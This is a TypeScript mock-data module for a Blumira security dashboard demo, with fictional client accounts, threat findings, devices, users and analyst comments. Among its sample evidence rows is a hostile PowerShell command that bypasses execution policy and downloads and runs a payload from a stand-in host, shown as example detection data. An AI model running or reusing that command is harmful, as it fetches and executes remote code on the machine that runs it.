import type {
  MspAccount,
  AccountDetails,
  Finding,
  AgentDevice,
  AgentKey,
  BlumiraUser,
  EnrichedAccount,
  EvidenceResponse,
  EvidenceRow,
  FindingComment,
} from "./blumira-api";

const DEMO_ACCOUNTS: MspAccount[] = [
  { account_id: "demo-acct-001", name: "Acme Corp", open_findings: 12 },
  { account_id: "demo-acct-002", name: "Globex Industries", open_findings: 7 },
  { account_id: "demo-acct-003", name: "Initech Solutions", open_findings: 3 },
  { account_id: "demo-acct-004", name: "Stark Enterprises", open_findings: 18 },
  { account_id: "demo-acct-005", name: "Wayne Medical Group", open_findings: 5 },
];

const ACCOUNT_DETAILS: Record<string, AccountDetails> = {
  "demo-acct-001": { agent_count_available: 100, agent_count_used: 45, license: "Enterprise", user_count: 28 },
  "demo-acct-002": { agent_count_available: 75, agent_count_used: 32, license: "Business", user_count: 15 },
  "demo-acct-003": { agent_count_available: 50, agent_count_used: 12, license: "Business", user_count: 8 },
  "demo-acct-004": { agent_count_available: 200, agent_count_used: 87, license: "Enterprise", user_count: 42 },
  "demo-acct-005": { agent_count_available: 60, agent_count_used: 22, license: "Business", user_count: 11 },
};

function daysAgo(n: number): string {
  return new Date(Date.now() - n * 86400000).toISOString();
}

function hoursAgo(n: number): string {
  return new Date(Date.now() - n * 3600000).toISOString();
}

const FINDING_TEMPLATES: Omit<Finding, "finding_id" | "org_name" | "org_id" | "created" | "modified">[] = [
  { name: "Brute Force Authentication Attempt", priority: 1, status_name: "Open", type_name: "Threat", category: "Authentication", subcategory: "Brute Force", description: "Multiple failed authentication attempts detected from a single source IP, indicating a potential brute force attack against user accounts.", summary: "Over 500 failed login attempts detected within 10 minutes from IP 203.0.113.42.", source: "Windows Security", hostname: "DC-PRIMARY", ip_address: "203.0.113.42" },
  { name: "Suspicious PowerShell Execution", priority: 1, status_name: "Open", type_name: "Threat", category: "Execution", subcategory: "PowerShell", description: "Encoded PowerShell command detected that attempts to download and execute a remote payload.", summary: "Base64 encoded PowerShell command executed by user jsmith on workstation WS-042.", source: "Windows Security", hostname: "WS-042", user: "jsmith" },
  { name: "Lateral Movement via SMB", priority: 2, status_name: "Open", type_name: "Threat", category: "Lateral Movement", subcategory: "SMB", description: "Unusual SMB connections detected between workstations, potentially indicating lateral movement.", summary: "WS-015 initiated SMB connections to 8 different hosts within 5 minutes.", source: "Network Sensor", hostname: "WS-015", ip_address: "10.0.1.15" },
  { name: "Unauthorized Admin Account Created", priority: 1, status_name: "Open", type_name: "Threat", category: "Persistence", subcategory: "Account Creation", description: "A new administrator account was created outside of normal provisioning procedures.", summary: "Account 'svc_backup2' added to Domain Admins group by user admin-temp.", source: "Active Directory", hostname: "DC-PRIMARY", user: "admin-temp" },
  { name: "Malware Detection - Trojan.GenericKD", priority: 2, status_name: "Open", type_name: "Threat", category: "Malware", subcategory: "Trojan", description: "Endpoint protection detected a known trojan variant attempting to establish persistence.", summary: "Trojan.GenericKD.46789 detected in C:\\Users\\mkellar\\Downloads\\invoice.exe", source: "Endpoint Protection", hostname: "WS-067", user: "mkellar" },
  { name: "Unusual Outbound DNS Traffic", priority: 3, status_name: "Open", type_name: "Suspect", category: "Network", subcategory: "DNS", description: "High volume of DNS queries to recently registered domains detected, potentially indicating DNS tunneling or C2 communication.", summary: "Over 2,000 DNS queries to suspicious domains in the last hour from 10.0.2.33.", source: "DNS Sensor", ip_address: "10.0.2.33" },
  { name: "Failed MFA Challenge - Multiple Users", priority: 2, status_name: "Open", type_name: "Suspect", category: "Authentication", subcategory: "MFA", description: "Multiple users experiencing MFA failures from unusual geographic locations.", summary: "12 users had MFA failures from IP ranges associated with known VPN providers.", source: "Azure AD" },
  { name: "Deprecated TLS Version in Use", priority: 4, status_name: "Open", type_name: "Operational", category: "Configuration", subcategory: "TLS", description: "Server is accepting connections using TLS 1.0/1.1 which are deprecated and vulnerable.", summary: "Web server web-prod-01 still accepts TLS 1.0 connections.", source: "Vulnerability Scanner", hostname: "web-prod-01" },
  { name: "Agent Offline - Critical Server", priority: 3, status_name: "Open", type_name: "Operational", category: "Agent", subcategory: "Connectivity", description: "Blumira agent on a critical server has not reported in over 24 hours.", summary: "Agent on DB-PRIMARY has been offline since 2025-03-01T08:00:00Z.", source: "Agent Monitor", hostname: "DB-PRIMARY" },
  { name: "Privilege Escalation Attempt", priority: 1, status_name: "Open", type_name: "Threat", category: "Privilege Escalation", subcategory: "Local", description: "User attempted to exploit a known vulnerability to gain elevated privileges.", summary: "CVE-2024-1234 exploitation attempt detected on SRV-APP-01 by user contractor_a.", source: "Host IDS", hostname: "SRV-APP-01", user: "contractor_a" },
  { name: "Phishing Email Delivered", priority: 2, status_name: "Open", type_name: "Threat", category: "Initial Access", subcategory: "Phishing", description: "Phishing email with malicious attachment delivered to multiple recipients.", summary: "Email with subject 'Urgent: Invoice Payment Required' delivered to 15 mailboxes.", source: "Email Gateway" },
  { name: "SSL Certificate Expiring", priority: 5, status_name: "Open", type_name: "Operational", category: "Configuration", subcategory: "Certificate", description: "SSL certificate for a production service will expire within 30 days.", summary: "Certificate for api.acmecorp.com expires on 2025-04-15.", source: "Certificate Monitor", hostname: "LB-PROD-01" },
  { name: "Ransomware Behavior Detected", priority: 1, status_name: "Open", type_name: "Threat", category: "Impact", subcategory: "Ransomware", description: "File encryption patterns consistent with ransomware activity detected on endpoint.", summary: "Rapid file modification of 200+ files detected in shared drive on FS-01.", source: "Endpoint Protection", hostname: "FS-01", user: "lthompson" },
  { name: "Data Exfiltration Attempt", priority: 1, status_name: "Resolved", status: 2, type_name: "Threat", category: "Exfiltration", subcategory: "Cloud Storage", description: "Large volume of sensitive data uploaded to unauthorized cloud storage service.", summary: "5.2 GB uploaded to personal Dropbox from workstation WS-023.", source: "DLP", hostname: "WS-023", user: "rjohnson", resolution_name: "True Positive - Remediated" },
  { name: "Suspicious Cron Job Added", priority: 3, status_name: "Resolved", status: 2, type_name: "Suspect", category: "Persistence", subcategory: "Scheduled Task", description: "New cron job added to download and execute a script from an external URL.", summary: "Cron job on linux-web-03 downloads from http://suspicious-domain.com/update.sh.", source: "Linux Audit", hostname: "linux-web-03", resolution_name: "False Positive" },
  { name: "Firewall Rule Change", priority: 4, status_name: "Open", type_name: "Operational", category: "Configuration", subcategory: "Firewall", description: "Firewall rule modified to allow inbound traffic on non-standard port.", summary: "New rule allowing TCP/4444 inbound added to perimeter firewall.", source: "Firewall Log" },
  { name: "Password Spray Attack", priority: 2, status_name: "Open", type_name: "Threat", category: "Authentication", subcategory: "Password Spray", description: "Distributed authentication attempts using common passwords across multiple accounts.", summary: "47 accounts targeted with password 'Summer2025!' from rotating IP addresses.", source: "Azure AD" },
  { name: "Unpatched Critical Vulnerability", priority: 3, status_name: "Open", type_name: "Operational", category: "Vulnerability", subcategory: "Patching", description: "Critical CVE remains unpatched beyond SLA on production systems.", summary: "CVE-2024-5678 (CVSS 9.8) unpatched on 12 servers for 45+ days.", source: "Vulnerability Scanner" },
];

function buildFindings(): Finding[] {
  const findings: Finding[] = [];
  let idx = 0;

  for (const account of DEMO_ACCOUNTS) {
    const count = account.open_findings || 3;
    for (let i = 0; i < count && idx < FINDING_TEMPLATES.length; i++) {
      const t = FINDING_TEMPLATES[idx % FINDING_TEMPLATES.length];
      findings.push({
        ...t,
        finding_id: `demo-finding-${String(idx + 1).padStart(3, "0")}`,
        org_name: account.name,
        org_id: account.account_id,
        created: daysAgo(Math.floor(Math.random() * 30) + 1),
        modified: hoursAgo(Math.floor(Math.random() * 72) + 1),
      });
      idx++;
    }
  }

  while (idx < FINDING_TEMPLATES.length) {
    const t = FINDING_TEMPLATES[idx];
    const account = DEMO_ACCOUNTS[idx % DEMO_ACCOUNTS.length];
    findings.push({
      ...t,
      finding_id: `demo-finding-${String(idx + 1).padStart(3, "0")}`,
      org_name: account.name,
      org_id: account.account_id,
      created: daysAgo(Math.floor(Math.random() * 30) + 1),
      modified: hoursAgo(Math.floor(Math.random() * 72) + 1),
    });
    idx++;
  }

  return findings;
}

const HOSTNAMES = [
  "WS-001", "WS-002", "WS-003", "WS-015", "WS-023", "WS-042", "WS-067",
  "DC-PRIMARY", "DC-SECONDARY", "SRV-APP-01", "SRV-APP-02", "SRV-WEB-01",
  "DB-PRIMARY", "DB-REPLICA", "FS-01", "LB-PROD-01", "linux-web-03",
  "MAIL-01", "VPN-GW-01", "BACKUP-01",
];

function buildDevices(accountId: string, count: number): AgentDevice[] {
  return Array.from({ length: count }, (_, i) => {
    const hostname = HOSTNAMES[i % HOSTNAMES.length];
    const isOnline = Math.random() > 0.2;
    return {
      device_id: `demo-device-${accountId}-${String(i + 1).padStart(3, "0")}`,
      hostname: `${hostname}`,
      alive: isOnline ? hoursAgo(0) : daysAgo(Math.floor(Math.random() * 7) + 1),
      arch: Math.random() > 0.3 ? "x86_64" : "arm64",
      created: daysAgo(Math.floor(Math.random() * 180) + 30),
      is_excluded: Math.random() < 0.05,
      is_isolated: Math.random() < 0.03,
      is_sleeping: !isOnline && Math.random() > 0.5,
      isolation_requested: false,
      key_id: `demo-key-${accountId}-001`,
      keyname: "Production Key",
      modified: hoursAgo(Math.floor(Math.random() * 48)),
      org_id: accountId,
      plat: Math.random() > 0.25 ? "windows" : Math.random() > 0.5 ? "linux" : "macos",
    };
  });
}

function buildKeys(accountId: string): AgentKey[] {
  return [
    { key_id: `demo-key-${accountId}-001`, key_name: "Production Key", name: "Production Key", status: "active", created_at: daysAgo(180) },
    { key_id: `demo-key-${accountId}-002`, key_name: "Staging Key", name: "Staging Key", status: "active", created_at: daysAgo(90) },
  ];
}

const DEMO_USERS_BY_ACCOUNT: Record<string, BlumiraUser[]> = {
  "demo-acct-001": [
    { user_id: "u-001", email: "admin@acmecorp.com", first_name: "Sarah", last_name: "Chen", name: "Sarah Chen", role: "admin", status: "active", org_id: "demo-acct-001", org_name: "Acme Corp", created: daysAgo(365) },
    { user_id: "u-002", email: "jsmith@acmecorp.com", first_name: "James", last_name: "Smith", name: "James Smith", role: "analyst", status: "active", org_id: "demo-acct-001", org_name: "Acme Corp", created: daysAgo(200) },
    { user_id: "u-003", email: "mkellar@acmecorp.com", first_name: "Mike", last_name: "Kellar", name: "Mike Kellar", role: "analyst", status: "active", org_id: "demo-acct-001", org_name: "Acme Corp", created: daysAgo(150) },
  ],
  "demo-acct-002": [
    { user_id: "u-004", email: "ops@globex.io", first_name: "Lisa", last_name: "Park", name: "Lisa Park", role: "admin", status: "active", org_id: "demo-acct-002", org_name: "Globex Industries", created: daysAgo(300) },
    { user_id: "u-005", email: "security@globex.io", first_name: "David", last_name: "Torres", name: "David Torres", role: "analyst", status: "active", org_id: "demo-acct-002", org_name: "Globex Industries", created: daysAgo(180) },
  ],
  "demo-acct-003": [
    { user_id: "u-006", email: "admin@initech.com", first_name: "Rachel", last_name: "Wong", name: "Rachel Wong", role: "admin", status: "active", org_id: "demo-acct-003", org_name: "Initech Solutions", created: daysAgo(250) },
  ],
  "demo-acct-004": [
    { user_id: "u-007", email: "ciso@stark.dev", first_name: "Alex", last_name: "Rivera", name: "Alex Rivera", role: "admin", status: "active", org_id: "demo-acct-004", org_name: "Stark Enterprises", created: daysAgo(400) },
    { user_id: "u-008", email: "soc@stark.dev", first_name: "Jordan", last_name: "Lee", name: "Jordan Lee", role: "analyst", status: "active", org_id: "demo-acct-004", org_name: "Stark Enterprises", created: daysAgo(120) },
    { user_id: "u-009", email: "tier1@stark.dev", first_name: "Casey", last_name: "Nguyen", name: "Casey Nguyen", role: "viewer", status: "active", org_id: "demo-acct-004", org_name: "Stark Enterprises", created: daysAgo(60) },
  ],
  "demo-acct-005": [
    { user_id: "u-010", email: "it@waynemedical.org", first_name: "Morgan", last_name: "Blake", name: "Morgan Blake", role: "admin", status: "active", org_id: "demo-acct-005", org_name: "Wayne Medical Group", created: daysAgo(350) },
  ],
};

const DEVICE_COUNTS: Record<string, number> = {
  "demo-acct-001": 45,
  "demo-acct-002": 32,
  "demo-acct-003": 12,
  "demo-acct-004": 87,
  "demo-acct-005": 22,
};

export function getDemoAccounts(): MspAccount[] {
  return DEMO_ACCOUNTS;
}

export function getDemoAccountDetail(accountId: string): AccountDetails | null {
  return ACCOUNT_DETAILS[accountId] || null;
}

export function getDemoFindings(): Finding[] {
  return buildFindings();
}

export function getDemoAccountFindings(accountId: string): Finding[] {
  return buildFindings().filter((f) => f.org_id === accountId);
}

export function getDemoFindingDetail(accountId: string, findingId: string): Finding | null {
  return buildFindings().find((f) => f.org_id === accountId && f.finding_id === findingId) || null;
}

export function getDemoAccountDevices(accountId: string): { devices: AgentDevice[]; meta: Record<string, unknown> | null } {
  const count = DEVICE_COUNTS[accountId] || 10;
  const devices = buildDevices(accountId, count);
  return { devices, meta: { total_items: count, page: 1, per_page: count } };
}

export function getDemoAccountKeys(accountId: string): AgentKey[] {
  return buildKeys(accountId);
}

export function getDemoAccountUsers(accountId: string): BlumiraUser[] {
  return DEMO_USERS_BY_ACCOUNT[accountId] || [];
}

export function getDemoAllUsers(): BlumiraUser[] {
  return Object.values(DEMO_USERS_BY_ACCOUNT).flat().sort((a, b) => {
    const nameA = a.name || a.email;
    const nameB = b.name || b.email;
    return nameA.localeCompare(nameB);
  });
}

export function getDemoEnrichedAccount(account: MspAccount): EnrichedAccount {
  const details = getDemoAccountDetail(account.account_id);
  const findings = getDemoAccountFindings(account.account_id);
  const { devices } = getDemoAccountDevices(account.account_id);
  const agentKeys = getDemoAccountKeys(account.account_id);

  return {
    ...account,
    details,
    findings,
    agentDevices: devices,
    agentKeys,
    deviceMeta: { total_items: devices.length },
    stats: {
      totalFindings: findings.length,
      criticalFindings: findings.filter((f) => f.priority === 1).length,
      openFindings: findings.filter((f) => f.status_name === "Open").length,
      totalDevices: devices.length,
      onlineDevices: devices.filter((d) => !d.is_sleeping && !d.is_isolated && !d.is_excluded).length,
      sleepingDevices: devices.filter((d) => d.is_sleeping).length,
      isolatedDevices: devices.filter((d) => d.is_isolated).length,
      excludedDevices: devices.filter((d) => d.is_excluded).length,
      agentKeysCount: agentKeys.length,
    },
  };
}

export function getDemoEnrichedAccounts(): EnrichedAccount[] {
  return DEMO_ACCOUNTS.map(getDemoEnrichedAccount);
}

const EVIDENCE_TEMPLATES: Record<string, { keys: string[]; rowGenerator: (count: number) => EvidenceRow[] }> = {
  "Brute Force Authentication Attempt": {
    keys: ["__time_matched", "src_ip", "dst_ip", "user", "event_id", "status", "logon_type", "workstation"],
    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
      __time_matched: new Date(Date.now() - (i * 2000 + Math.random() * 5000)).toISOString(),
      src_ip: "203.0.113.42",
      dst_ip: "10.0.1.5",
      user: ["jsmith", "admin", "svc_account", "jdoe", "mkellar"][i % 5],
      event_id: "4625",
      status: "0xc000006d",
      logon_type: "3",
      workstation: "DC-PRIMARY",
    })),
  },
  "Suspicious PowerShell Execution": {
    keys: ["__time_matched", "hostname", "user", "command_line", "parent_process", "pid", "event_id"],
    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
      __time_matched: new Date(Date.now() - (i * 60000 + Math.random() * 30000)).toISOString(),
      hostname: "WS-042",
      user: "jsmith",
      command_line: [
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
        "powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://mal.example/p')",
        "powershell Set-ExecutionPolicy Bypass -Scope Process",
      ][i % 3],
      parent_process: ["cmd.exe", "explorer.exe", "svchost.exe"][i % 3],
      pid: String(4000 + i * 127),
      event_id: "4104",
    })),
  },
  "Lateral Movement via SMB": {
    keys: ["__time_matched", "src_ip", "dst_ip", "src_hostname", "dst_hostname", "share_name", "user", "action"],
    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
      __time_matched: new Date(Date.now() - (i * 5000 + Math.random() * 10000)).toISOString(),
      src_ip: "10.0.1.15",
      dst_ip: `10.0.1.${20 + (i % 12)}`,
      src_hostname: "WS-015",
      dst_hostname: ["SRV-APP-01", "SRV-APP-02", "DC-SECONDARY", "FS-01", "DB-PRIMARY", "WS-023"][i % 6],
      share_name: ["C$", "ADMIN$", "IPC$", "SharedDocs"][i % 4],
      user: "admin-temp",
      action: ["connect", "read", "write"][i % 3],
    })),
  },
  "Unauthorized Admin Account Created": {
    keys: ["__time_matched", "target_user", "actor_user", "group_name", "event_id", "hostname", "action"],
    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
      __time_matched: new Date(Date.now() - (i * 120000 + Math.random() * 60000)).toISOString(),
      target_user: "svc_backup2",
      actor_user: "admin-temp",
      group_name: ["Domain Admins", "Enterprise Admins", "Schema Admins"][i % 3],
      event_id: ["4728", "4732", "4756"][i % 3],
      hostname: "DC-PRIMARY",
      action: ["Member added to group", "Account created", "Group membership changed"][i % 3],
    })),
  },
  "Ransomware Behavior Detected": {
    keys: ["__time_matched", "hostname", "user", "file_path", "action", "file_count", "process"],
    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
      __time_matched: new Date(Date.now() - (i * 500 + Math.random() * 1000)).toISOString(),
      hostname: "FS-01",
      user: "lthompson",
      file_path: [
        "\\\\FS-01\\shared\\accounting\\Q4-report.xlsx.encrypted",
        "\\\\FS-01\\shared\\hr\\employee-data.csv.encrypted",
        "\\\\FS-01\\shared\\projects\\design-specs.pdf.encrypted",
        "\\\\FS-01\\shared\\legal\\contracts-2025.docx.encrypted",
      ][i % 4],
      action: "file_modified",
      file_count: String(50 + i * 12),
      process: "suspicious_process.exe",
    })),
  },
};

function getDefaultEvidenceForFinding(findingName: string): { keys: string[]; rowGenerator: (count: number) => EvidenceRow[] } {
  return EVIDENCE_TEMPLATES[findingName] || {
    keys: ["__time_matched", "src_ip", "hostname", "user", "event_type", "detail"],
    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
      __time_matched: new Date(Date.now() - (i * 30000 + Math.random() * 60000)).toISOString(),
      src_ip: `10.0.${Math.floor(Math.random() * 5)}.${10 + i}`,
      hostname: HOSTNAMES[i % HOSTNAMES.length],
      user: ["jsmith", "admin", "svc_account", "mkellar", "rjohnson"][i % 5],
      event_type: "security_alert",
      detail: `Event detail row ${i + 1}`,
    })),
  };
}

export function getDemoFindingEvidence(
  accountId: string,
  findingId: string,
  page = 1,
  pageSize = 50
): EvidenceResponse {
  const finding = getDemoFindingDetail(accountId, findingId);
  if (!finding) {
    return {
      data: [],
      evidence_keys: [],
      status: "OK",
      meta: { page: 1, page_size: pageSize, total_items: 0, total_pages: 0 },
      links: { self: "", next: null, prev: null },
    };
  }

  const template = getDefaultEvidenceForFinding(finding.name);
  const totalItems = 8 + Math.floor(Math.random() * 20);
  const allRows = template.rowGenerator(totalItems);
  const totalPages = Math.ceil(totalItems / pageSize);
  const start = (page - 1) * pageSize;
  const pageRows = allRows.slice(start, start + pageSize);

  return {
    data: pageRows,
    evidence_keys: template.keys,
    status: "OK",
    meta: {
      page,
      page_size: pageSize,
      total_items: totalItems,
      total_pages: totalPages,
    },
    links: {
      self: `/findings/${findingId}/evidence?page=${page}`,
      next: page < totalPages ? `/findings/${findingId}/evidence?page=${page + 1}` : null,
      prev: page > 1 ? `/findings/${findingId}/evidence?page=${page - 1}` : null,
    },
  };
}

const DEMO_COMMENTS: FindingComment[] = [
  {
    id: "comm-001",
    subject: "Initial Triage",
    body: "<p>Investigated the source IP. This appears to be an external actor based on geolocation data (Eastern Europe). Escalating to Tier 2 for deeper analysis.</p>",
    age: 86400,
    sender: { id: "u-002", first_name: "James", last_name: "Smith", email: "jsmith@acmecorp.com" },
  },
  {
    id: "comm-002",
    subject: "Update",
    body: "<p>Confirmed the IP is associated with a known threat group. Blocking at the firewall and monitoring for related activity across other accounts.</p>",
    age: 43200,
    sender: { id: "u-007", first_name: "Alex", last_name: "Rivera", email: "ciso@stark.dev" },
  },
  {
    id: "comm-003",
    subject: "Remediation",
    body: "<p>Password reset enforced for all impacted accounts. MFA enrollment verified. Continuing to monitor for 48 hours.</p>",
    age: 7200,
    sender: { id: "u-001", first_name: "Sarah", last_name: "Chen", email: "admin@acmecorp.com" },
  },
];

export function getDemoFindingComments(accountId: string, findingId: string): FindingComment[] {
  const finding = getDemoFindingDetail(accountId, findingId);
  if (!finding) return [];
  if (finding.priority <= 2) return DEMO_COMMENTS;
  if (finding.priority === 3) return DEMO_COMMENTS.slice(0, 1);
  return [];
}

export function isDemoMode(): boolean {
  return process.env.DEMO_MODE === "true" || process.env.NEXT_PUBLIC_DEMO_MODE === "true";
}
